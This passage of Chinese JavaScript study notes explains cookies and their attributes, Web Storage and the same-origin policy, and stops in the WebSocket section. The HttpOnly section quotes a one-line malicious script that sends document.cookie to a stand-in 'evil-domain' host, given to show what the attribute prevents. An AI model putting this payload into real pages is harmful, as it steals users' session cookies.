# JavaScript笔记四.3

<!-- TOC -->

- [JavaScript笔记四.3](#javascript%E7%AC%94%E8%AE%B0%E5%9B%9B3)
    - [4.Cookie](#4cookie)
      - [1.概述](#1%E6%A6%82%E8%BF%B0)
      - [2.Cookie 与 HTTP 协议](#2cookie-%E4%B8%8E-http-%E5%8D%8F%E8%AE%AE)
        - [2.1 HTTP 回应：Cookie 的生成](#21-http-%E5%9B%9E%E5%BA%94cookie-%E7%9A%84%E7%94%9F%E6%88%90)
        - [2.2 HTTP 请求：Cookie 的发送](#22-http-%E8%AF%B7%E6%B1%82cookie-%E7%9A%84%E5%8F%91%E9%80%81)
      - [3.Cookie 的属性](#3cookie-%E7%9A%84%E5%B1%9E%E6%80%A7)
        - [3.1 Expires，Max-Age](#31-expiresmax-age)
        - [3.2 Domain，Path](#32-domainpath)
        - [3.3 Secure，HttpOnly](#33-securehttponly)
      - [4.document.cookie](#4documentcookie)
    - [5.Web Storage：浏览器端数据储存机制](#5web-storage%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AB%AF%E6%95%B0%E6%8D%AE%E5%82%A8%E5%AD%98%E6%9C%BA%E5%88%B6)
      - [1.概述](#1%E6%A6%82%E8%BF%B0)
      - [2.操作方法](#2%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95)
        - [2.1 存入/读取数据](#21-%E5%AD%98%E5%85%A5%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE)
        - [2.2 清除数据](#22-%E6%B8%85%E9%99%A4%E6%95%B0%E6%8D%AE)
        - [2.3 遍历操作](#23-%E9%81%8D%E5%8E%86%E6%93%8D%E4%BD%9C)
      - [3.storage事件](#3storage%E4%BA%8B%E4%BB%B6)
    - [6.同源政策](#6%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96)
      - [1.概述](#1%E6%A6%82%E8%BF%B0)
        - [1.1 含义](#11-%E5%90%AB%E4%B9%89)
        - [1.2 目的](#12-%E7%9B%AE%E7%9A%84)
        - [1.3 限制范围](#13-%E9%99%90%E5%88%B6%E8%8C%83%E5%9B%B4)
      - [2.Cookie](#2cookie)
      - [3.iframe](#3iframe)
        - [3.1 片段识别符](#31-%E7%89%87%E6%AE%B5%E8%AF%86%E5%88%AB%E7%AC%A6)
        - [3.2 window.postMessage()](#32-windowpostmessage)
        - [3.3 LocalStorage](#33-localstorage)
      - [4.AJAX](#4ajax)
        - [4.1 JSONP](#41-jsonp)
        - [4.2 WebSocket](#42-websocket)
        - [4.3 CORS](#43-cors)
    - [7.AJAX](#7ajax)
      - [1.XMLHttpRequest对象](#1xmlhttprequest%E5%AF%B9%E8%B1%A1)
      - [2.XMLHttpRequest实例的属性](#2xmlhttprequest%E5%AE%9E%E4%BE%8B%E7%9A%84%E5%B1%9E%E6%80%A7)
        - [2.1 readyState](#21-readystate)
        - [2.2 onreadystatechange](#22-onreadystatechange)
        - [2.3 response](#23-response)
        - [2.4 responseType](#24-responsetype)
        - [2.5 responseText](#25-responsetext)
        - [2.6 responseXML](#26-responsexml)
        - [2.7 status](#27-status)
        - [2.8 statusText](#28-statustext)
        - [2.9 timeout](#29-timeout)
        - [2.10 事件监听接口](#210-%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E6%8E%A5%E5%8F%A3)
        - [2.11 withCredentials](#211-withcredentials)
      - [3.XMLHttpRequest实例的方法](#3xmlhttprequest%E5%AE%9E%E4%BE%8B%E7%9A%84%E6%96%B9%E6%B3%95)
        - [3.1 abort()](#31-abort)
        - [3.2 getAllResponseHeaders()](#32-getallresponseheaders)
        - [3.3 getResponseHeader()](#33-getresponseheader)
        - [3.4 open()](#34-open)
        - [3.5 send()](#35-send)
        - [3.6 setRequestHeader()](#36-setrequestheader)
        - [3.7 overrideMimeType()](#37-overridemimetype)
      - [4.XMLHttpRequest实例的事件](#4xmlhttprequest%E5%AE%9E%E4%BE%8B%E7%9A%84%E4%BA%8B%E4%BB%B6)
        - [4.1 readyStateChange事件](#41-readystatechange%E4%BA%8B%E4%BB%B6)
        - [4.2 progress事件](#42-progress%E4%BA%8B%E4%BB%B6)
        - [4.3 load事件、error事件、abort事件](#43-load%E4%BA%8B%E4%BB%B6error%E4%BA%8B%E4%BB%B6abort%E4%BA%8B%E4%BB%B6)
        - [4.4 loadend事件](#44-loadend%E4%BA%8B%E4%BB%B6)
      - [5."get"和"post"请求的区别](#5%22get%22%E5%92%8C%22post%22%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8C%BA%E5%88%AB)
      - [6.文件上传](#6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
    - [8.CORS通信](#8cors%E9%80%9A%E4%BF%A1)
      - [1.简介](#1%E7%AE%80%E4%BB%8B)
      - [2.两种请求](#2%E4%B8%A4%E7%A7%8D%E8%AF%B7%E6%B1%82)
      - [3.简单请求](#3%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82)
        - [3.1 基本流程](#31-%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B)
        - [3.2 withCredentials 属性](#32-withcredentials-%E5%B1%9E%E6%80%A7)
      - [4.非简单请求](#4%E9%9D%9E%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82)
        - [4.1 预检请求](#41-%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82)
        - [4.2 预检请求的回应](#42-%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9B%9E%E5%BA%94)
        - [4.3 浏览器的正常请求和回应](#43-%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E6%AD%A3%E5%B8%B8%E8%AF%B7%E6%B1%82%E5%92%8C%E5%9B%9E%E5%BA%94)
      - [5.与JSONP的比较](#5%E4%B8%8Ejsonp%E7%9A%84%E6%AF%94%E8%BE%83)
  - [9.设计模式](#9%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F)
    - [1.单例模式](#1%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F)
    - [2.工厂模式](#2%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F)
    - [3.构造函数](#3%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0)
    - [4.原型模式](#4%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F)
    - [5.混合模式](#5%E6%B7%B7%E5%90%88%E6%A8%A1%E5%BC%8F)

<!-- /TOC -->

### 4.Cookie

#### 1.概述

`Cookie` 是服务器保存在浏览器的一小段文本信息，每个 `Cookie` 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。

`Cookie` 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。

- --
- 对话（session）管理：保存登录、购物车等需要记录的信息。
- 个性化：保存用户的偏好，比如网页的字体大小、背景色等等。
- 追踪：记录和分析用户行为。
- --

有些开发者使用 `Cookie` 作为客户端储存。这样做虽然可行，但是并不推荐，因为 `Cookie` 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 `Web storage API` 和 `IndexedDB`。

`Cookie` 包含以下几方面的信息。

- --
- a.`Cookie` 的名字
- b.`Cookie` 的值（真正的数据写在这里面）
- c.到期时间
- d.所属域名（默认是当前域名）
- e.生效的路径（默认是当前网址）
- --

举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 `Cookie`。这个 `Cookie` 就会包含`www.example.com`这个域名，以及根路径`/`。这意味着，这个 `Cookie` 对该域名的根路径和它的所有子路径都有效。如果路径设为`/forums`，那么这个 `Cookie` 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 `Cookie` 发送给服务器。

浏览器可以设置不接受 `Cookie`，也可以设置不向服务器发送 `Cookie`。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 `Cookie` 功能。

```
// 浏览器是否打开 Cookie 功能
window.navigator.cookieEnabled // true
```

`document.cookie`属性返回当前网页的 `Cookie`。

```
// 当前网页的 Cookie
document.cookie
```

不同浏览器对 `Cookie` 数量和大小的限制，是不一样的。一般来说，单个域名设置的 `Cookie` 不应超过30个，每个 `Cookie` 的大小不能超过4KB。超过限制以后，`Cookie` 将被忽略，不会被设置。

浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 `Cookie`。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 `Cookie`，可以被`https://example.com`读取。

#### 2.Cookie 与 HTTP 协议

`Cookie` 由 HTTP 协议生成，也主要是供 HTTP 协议使用。

##### 2.1 HTTP 回应：Cookie 的生成

服务器如果希望在浏览器保存 `Cookie`，就要在 HTTP 回应的头信息里面，放置一个`Set-Cookie`字段。

`Set-Cookie:foo=bar`

上面代码会在浏览器保存一个名为foo的 `Cookie`，它的值为bar。

HTTP 回应可以包含多个`Set-Cookie`字段，即在浏览器生成多个 `Cookie`。下面是一个例子。

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

除了 `Cookie` 的值，`Set-Cookie`字段还可以附加 `Cookie` 的属性。

```
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```

一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。

`Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly`

下面是一个例子。

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly`

如果服务器想改变一个早先设置的 `Cookie`，必须同时满足四个条件：`Cookie` 的`key`、`domain`、`path`和`secure`都匹配。举例来说，如果原始的 `Cookie` 是用如下的`Set-Cookie`设置的。

`Set-Cookie: key1=value1; domain=example.com; path=/blog`

改变上面这个 `Cookie` 的值，就必须使用同样的`Set-Cookie`。

`Set-Cookie: key1=value2; domain=example.com; path=/blog`

只要有一个属性不同，就会生成一个全新的 `Cookie`，而不是替换掉原来那个 `Cookie`。

`Set-Cookie: key1=value2; domain=example.com; path=/`

上面的命令设置了一个全新的同名 `Cookie`，但是`path`属性不一样。下一次访问`example.com/blog`的时候，浏览器将向服务器发送两个同名的 `Cookie`。

`Cookie: key1=value1; key1=value2`

上面代码的两个 `Cookie` 是同名的，匹配越精确的 `Cookie` 排在越前面。

##### 2.2 HTTP 请求：Cookie 的发送

浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的`Cookie`字段。

`Cookie: foo=bar`

上面代码会向服务器发送名为foo的 `Cookie`，值为bar。

`Cookie`字段可以包含多个 `Cookie`，使用分号（;）分隔。

`Cookie: name=value; name2=value2; name3=value3`

下面是一个例子。

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

服务器收到浏览器发来的 `Cookie` 时，有两点是无法知道的。

- `Cookie` 的各种属性，比如何时过期。
- 哪个域名设置的 `Cookie`，到底是一级域名设的，还是某一个二级域名设的。

#### 3.Cookie 的属性

##### 3.1 Expires，Max-Age

`Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 `Cookie`。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`进行格式转换。

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`

如果不设置该属性，或者设为`null`，`Cookie` 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 `Cookie` 就会被删除。另外，浏览器根据本地时间，决定 `Cookie` 是否过期，由于本地时间是不精确的，所以没有办法保证 `Cookie` 一定会在服务器指定的时间过期。

`Max-Age`属性指定从现在开始 `Cookie` 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 `Cookie`。

如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。

如果`Set-Cookie`字段没有指定`Expires`或`Max-Age`属性，那么这个 `Cookie` 就是 `Session Cookie`，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 `Cookie`。

##### 3.2 Domain，Path

`Domain`属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 `Cookie`。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如`www.example.com`会设为`example.com`，而且以后如果访问`example.com`的任何子域名，HTTP 请求也会带上这个 `Cookie`。如果服务器在`Set-Cookie`字段指定的域名，不属于当前域名，浏览器会拒绝这个 `Cookie`。

`Path`属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 `Cookie`。只要浏览器发现，`Path`属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 `Cookie`。比如，`PATH`属性是`/`，那么请求`/docs`路径也会包含该 `Cookie`。当然，前提是域名必须一致。

##### 3.3 Secure，HttpOnly

`Secure`属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 `Cookie` 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的`Secure`属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。

`HttpOnly`属性指定该 `Cookie` 无法通过 JavaScript 脚本拿到，主要是`Document.cookie`属性、`XMLHttpRequest`对象和 `Request API` 都拿不到该属性。这样就防止了该 `Cookie` 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 `Cookie`。

`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`

上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 `Cookie` 发往第三方服务器。如果设置了一个 `Cookie` 的`HttpOnly`属性，上面代码就不会读到该 `Cookie`。

#### 4.document.cookie

`document.cookie`属性用于读写当前网页的 `Cookie`。

读取的时候，它会返回当前网页的所有 `Cookie`，前提是该 `Cookie` 不能有`HTTPOnly`属性。

`document.cookie // "foo=bar;baz=bar"`

上面代码从`document.cookie`一次性读出两个 `Cookie`，它们之间使用分号分隔。必须手动还原，才能取出每一个 `Cookie` 的值。

```
var cookies = document.cookie.split(';');

for (var i = 0; i < cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
```

`document.cookie`属性是可写的，可以通过它为当前网站添加 `Cookie`。

`document.cookie = 'fontSize=14';`

写入的时候，`Cookie` 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 `Cookie` 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 `Cookie` 的值），这可以用`encodeURIComponent`方法达到。

但是，`document.cookie`一次只能写入一个 `Cookie`，而且写入并不是覆盖，而是添加。

```
document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
```

`document.cookie`读写行为的差异（一次可以读出全部 `Cookie`，但是只能写入一个 `Cookie`），与 HTTP 协议的 `Cookie` 通信格式有关。浏览器向服务器发送 `Cookie` 的时候，`Cookie`字段是使用一行将所有 `Cookie` 全部发送；服务器向浏览器设置 `Cookie` 的时候，`Set-Cookie`字段是一行设置一个 `Cookie`。

写入 `Cookie` 的时候，可以一起写入 `Cookie` 的属性。

`document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";`

上面代码中，写入 `Cookie` 的时候，同时设置了`expires`属性。属性值的等号两边，也是不能有空格的。

各个属性的写入注意点如下。

- --
- `path`属性必须为绝对路径，默认为当前路径。
- `domain`属性值必须是当前发送 `Cookie` 的域名的一部分。比如，当前域名是example.com，就不能将其设为foo.com。该属性默认为当前的一级域名（不含二级域名）。
- `max-age`属性的值为秒数。
- `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。
- --

`document.cookie`写入 `Cookie` 的例子如下。

```
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
```

`Cookie` 的属性一旦设置完成，就没有办法读取这些属性的值。

删除一个现存 `Cookie` 的唯一方法，是设置它的`expires`属性为一个过去的日期。

`document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';`

上面代码中，名为`fontSize`的 `Cookie` 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 `Cookie`。

### 5.Web Storage：浏览器端数据储存机制

#### 1.概述

这个API的作用是，使得网页可以在浏览器端储存数据。它分成两类：`sessionStorage`和`localStorage`。

`sessionStorage`保存的数据用于浏览器的一次会话，当会话结束（通常是该窗口关闭），数据被清空；`localStorage`保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。除了保存期限的长短不同，这两个对象的属性和方法完全一样。

它们很像`cookie`机制的强化版，能够动用大得多的存储空间。目前，每个域名的存储上限视浏览器而定，Chrome是2.5MB，Firefox和Opera是5MB，IE是10MB。其中，Firefox的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，在Firefox中，`a.example.com`和`b.example.com`共享5MB的存储空间。另外，与`Cookie`一样，它们也受同域限制。某个网页存入的数据，只有同域下的网页才能读取。

通过检查`window`对象是否包含`sessionStorage`和`localStorage`属性，可以确定浏览器是否支持这两个对象。

```
function checkStorageSupport() {

  // sessionStorage
  if (window.sessionStorage) {
    return true;
  } else {
    return false;
  }

  // localStorage
  if (window.localStorage) {
    return true;
  } else {
    return false;
  }
}
```

#### 2.操作方法

##### 2.1 存入/读取数据

`sessionStorage`和`localStorage`保存的数据，都以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。

存入数据使用`setItem`方法。它接受两个参数，第一个是键名，第二个是保存的数据。

```
sessionStorage.setItem("key","value");
localStorage.setItem("key","value");
```

读取数据使用`getItem`方法。它只有一个参数，就是键名。

```
var valueSession = sessionStorage.getItem("key");
var valueLocal = localStorage.getItem("key");
```

##### 2.2 清除数据

`removeItem`方法用于清除某个键名对应的数据。

```
sessionStorage.removeItem('key');
localStorage.removeItem('key');
```

`clear`方法用于清除所有保存的数据。

```
sessionStorage.clear();
localStorage.clear();
```

##### 2.3 遍历操作

利用`length`属性和`key`方法，可以遍历所有的键。

```
for(var i = 0; i < localStorage.length; i++){
    console.log(localStorage.key(i));
}
```

其中的`key`方法，根据位置（从0开始）获得键值。

`localStorage.key(1);`

#### 3.storage事件

当储存的数据发生变化时，会触发`storage`事件。我们可以指定这个事件的回调函数。

`window.addEventListener("storage",onStorageChange);`

回调函数接受一个`event`对象作为参数。这个`event`对象的`key`属性，保存发生变化的键名。

```
function onStorageChange(e) {
  console.log(e.key);
}
```

除了`key`属性，`event`对象的属性还有三个：

- --
- `oldValue`：更新前的值。如果该键为新增加，则这个属性为`null`。
- `newValue`：更新后的值。如果该键被删除，则这个属性为`null`。
- `url`：原始触发`storage`事件的那个网页的网址。
- --

值得特别注意的是，该事件不在导致数据变化的当前页面触发。如果浏览器同时打开一个域名下面的多个页面，当其中的一个页面改变 `localStorage`的数据时，其他所有页面的`storage`事件会被触发，而原始页面并不触发`storage`事件。可以通过这种机制，实现多个窗口之间的通信。所有浏览器之中，只有 IE 浏览器除外，它会在所有页面触发`storage`事件。

### 6.同源政策

浏览器安全的基石是**同源政策（same-origin policy）**。

#### 1.概述

##### 1.1 含义

1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。

最初，它的含义是指，A 网页设置的 `Cookie`，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是”三个相同“。

- --
- 协议相同
- 域名相同
- 端口相同
- --

举例来说，`http://www.example.com/dir/page.html`这个网址，协议是`http://`，域名是`www.example.com`，端口是`80`（默认端口可以省略），它的同源情况如下。

```
http://www.example.com/dir2/other.html：同源
http://example.com/dir/other.html：不同源（域名不同）
http://v2.www.example.com/dir/other.html：不同源（域名不同）
http://www.example.com:81/dir/other.html：不同源（端口不同）
https://www.example.com/dir/page.html：不同源（协议不同）
```

##### 1.2 目的

同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。

设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 `Cookie`，包含了一些隐私信息（比如存款总额）。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 `Cookie`，那么隐私信息就会泄漏。更可怕的是，`Cookie` 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。

由此可见，同源政策是必需的，否则 `Cookie` 可以共享，互联网就毫无安全可言了。

##### 1.3 限制范围

随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。

- --
- 无法读取非同源网页的 `Cookie`、`LocalStorage` 和 `IndexedDB`。
- 无法接触非同源网页的 DOM。
- 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。
- --

另外，通过 JavaScript 脚本可以拿到其他窗口的`window`对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的`window`对象的九个属性和四个方法。

- --
- `window.closed`
- `window.frames`
- `window.length`
- `window.location`
- `window.opener`
- `window.parent`
- `window.self`
- `window.top`
- `window.window`
- --
- `window.blur()`
- `window.close()`
- `window.focus()`
- `window.postMessage()`
- --

上面的九个属性之中，只有`window.location`是可读写的，其他八个全部都是只读。

虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。

#### 2.Cookie

`Cookie` 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置`document.domain`共享 `Cookie`。

举例来说，A 网页的网址是`http://w1.example.com/a.html`，B 网页的网址是`http://w2.example.com/b.html`，那么只要设置相同的`document.domain`，两个网页就可以共享 `Cookie`。因为浏览器通过`document.domain属性来检查是否同源`。

```
// 两个网页都需要设置
document.domain = 'example.com';
```

注意，A 和 B 两个网页都需要设置`document.domain`属性，才能达到同源的目的。因为设置`document.domain`的同时，会把端口重置为`null`，因此如果只设置一个网页的`document.domain`，会导致两个网址的端口不同，还是达不到同源的目的。

现在，A 网页通过脚本设置一个 `Cookie`。

`document.cookie = "test1=hello";`

B 网页就可以读到这个 `Cookie`。

`var allCookie = document.cookie;`

注意，这种方法只适用于 `Cookie` 和 `iframe` 窗口，`LocalStorage` 和 `IndexedDB` 无法通过这种方法，规避同源政策，而要使用下文介绍 `PostMessage API`。

另外，服务器也可以在设置 `Cookie` 的时候，指定 `Cookie` 的所属域名为一级域名，比如.example.com。

`Set-Cookie: key=value; domain=.example.com; path=/`

这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 `Cookie`。

#### 3.iframe

`iframe`元素可以在当前网页之中，嵌入其他网页。每个`iframe`元素形成自己的窗口，即有自己的`window`对象。`iframe`窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。

比如，父窗口运行下面的命令，如果`iframe`窗口不是同源，就会报错。

```
document
.getElementById("myIFrame")
.contentWindow
.document
// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
```

上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。

反之亦然，子窗口获取主窗口的 DOM 也会报错。

```
window.parent.document.body
// 报错
```

这种情况不仅适用于`iframe`窗口，还适用于`window.open`方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。

如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的`document.domain`属性，就可以规避同源政策，拿到 DOM。

对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。

- --
- 片段识别符（fragment identifier）
- 跨文档通信API（Cross-document messaging）
- --

##### 3.1 片段识别符

片段标识符（fragment identifier）指的是，URL 的`#`号后面的部分，比如`http://example.com/x.html#fragment`的`#fragment`。如果只是改变片段标识符，页面不会重新刷新。

父窗口可以把信息，写入子窗口的片段标识符。

```
var src = originURL + '#' + data;
document.getElementById('myIFrame').src = src;
```

上面代码中，父窗口把所要传递的信息，写入 `iframe` 窗口的片段标识符。

子窗口通过监听`hashchange`事件得到通知。

```
window.onhashchange = checkMessage;

function checkMessage() {
  var message = window.location.hash;
  // ...
}
```

同样的，子窗口也可以改变父窗口的片段标识符。

`parent.location.href = target + '#' + hash;`

##### 3.2 window.postMessage()

上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：**跨文档通信 API（Cross-document messaging）**。

这个 API 为window对象新增了一个`window.postMessage`方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口aaa.com向子窗口bbb.com发消息，调用`postMessage`方法就可以了。

```
// 父窗口打开一个子窗口
var popup = window.open('http://bbb.com', 'title');
// 父窗口向子窗口发消息
popup.postMessage('Hello World!', 'http://bbb.com');
```

`postMessage`方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为`*`，表示不限制域名，向所有窗口发送。

子窗口向父窗口发送消息的写法类似。

```
// 子窗口向父窗口发消息
window.opener.postMessage('Nice to see you', 'http://aaa.com');
```

父窗口和子窗口都可以通过`message`事件，监听对方的消息。

```
// 父窗口和子窗口都可以用下面的代码，
// 监听 message 消息
window.addEventListener('message', function (e) {
  console.log(e.data);
},false);
```

`message`事件的参数是事件对象`event`，提供以下三个属性。

- --
- `event.source`：发送消息的窗口
- `event.origin`: 消息发向的网址
- `event.data`: 消息内容
- --

下面的例子是，子窗口通过`event.source`属性引用父窗口，然后发送消息。

```
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  event.source.postMessage('Nice to see you!', '*');
}
```

上面代码有几个地方需要注意。首先，`receiveMessage`函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，`postMessage`方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。

`event.origin`属性可以过滤不是发给本窗口的消息。

```
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  if (event.origin !== 'http://aaa.com') return;
  if (event.data === 'Hello World') {
    event.source.postMessage('Hello', event.origin);
  } else {
    console.log(event.data);
  }
}
```

##### 3.3 LocalStorage

通过`window.postMessage`，读写其他窗口的 `LocalStorage` 也成为了可能。

下面是一个例子，主窗口写入 `iframe` 子窗口的`localStorage`。

```
window.onmessage = function(e) {
  if (e.origin !== 'http://bbb.com') {
    return;
  }
  var payload = JSON.parse(e.data);
  localStorage.setItem(payload.key, JSON.stringify(payload.data));
};
```

上面代码中，子窗口将父窗口发来的消息，写入自己的 `LocalStorage`。

父窗口发送消息的代码如下。

```
var win = document.getElementsByTagName('iframe')[0].contentWindow;
var obj = { name: 'Jack' };
win.postMessage(
  JSON.stringify({key: 'storage', data: obj}),
  'http://bbb.com'
);
```

加强版的子窗口接收消息的代码如下。

```
window.onmessage = function(e) {
  if (e.origin !== 'http://bbb.com') return;
  var payload = JSON.parse(e.data);
  switch (payload.method) {
    case 'set':
      localStorage.setItem(payload.key, JSON.stringify(payload.data));
      break;
    case 'get':
      var parent = window.parent;
      var data = localStorage.getItem(payload.key);
      parent.postMessage(data, 'http://aaa.com');
      break;
    case 'remove':
      localStorage.removeItem(payload.key);
      break;
  }
};
```

加强版的父窗口发送消息代码如下。

```
var win = document.getElementsByTagName('iframe')[0].contentWindow;
var obj = { name: 'Jack' };
// 存入对象
win.postMessage(
  JSON.stringify({key: 'storage', method: 'set', data: obj}),
  'http://bbb.com'
);
// 读取对象
win.postMessage(
  JSON.stringify({key: 'storage', method: "get"}),
  "*"
);
window.onmessage = function(e) {
  if (e.origin != 'http://aaa.com') return;
  console.log(JSON.parse(e.data).name);
};
```

#### 4.AJAX

同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。

除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。

- --
- JSONP
- WebSocket
- CORS
- --

##### 4.1 JSONP

JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务端改造非常小。

它的基本思想是，网页通过添加一个`<script>`元素，向服务器请求 JSON 数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。

首先，网页动态插入`<script>`元素，由它向跨源网址发出请求。

```
function addScriptTag(src) {
  var script = document.createElement('script');
  script.setAttribute("type","text/javascript");
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () {
  addScriptTag('http://example.com/ip?callback=foo');
}

function foo(data) {
  console.log('Your public IP address is: ' + data.ip);
};
```

上面代码通过动态添加`<script>`元素，向服务器`example.com`发出请求。注意，该请求的查询字符串有一个`callback`参数，用来指定回调函数的名字，这对于 JSONP 是必需的。

服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。

```
foo({
  "ip": "8.8.8.8"
});
```

由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用`JSON.parse`的步骤。

##### 4.2 WebSocket

`WebSocket` 是一种通信协议，使用`ws://（非加密）`和`wss://（加密）`作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自维基百科）。

```
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
Origin: http://example.com
```

